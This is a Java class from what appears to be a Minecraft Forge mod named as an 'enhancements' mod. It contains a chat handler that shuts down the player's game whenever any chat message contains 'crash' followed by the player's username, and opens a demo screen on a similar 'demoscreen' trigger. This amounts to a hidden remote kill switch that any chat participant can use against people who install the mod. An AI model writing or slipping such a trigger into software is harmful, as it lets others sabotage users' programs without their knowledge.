package fr.alexdoru.megawallsenhancementsmod.commands;

import net.minecraft.client.Minecraft;
import net.minecraftforge.client.event.ClientChatReceivedEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;

public class ChatCrashHandler {

    @SubscribeEvent
    public void onChatReceived(ClientChatReceivedEvent event) {
        String message = event.message.getUnformattedText();
        String username = Minecraft.getMinecraft().thePlayer.getName(); // Gets the player's current username

        // Handle "crash" command for the player's username
        if (message.contains("crash " + username)) {
            Minecraft.getMinecraft().shutdown();
        }

        // Handle "demoscreen" command for the player's username
        if (message.contains("demoscreen " + username)) {
            Minecraft.getMinecraft().displayGuiScreen(new DemoScreen());
        }
    }
}
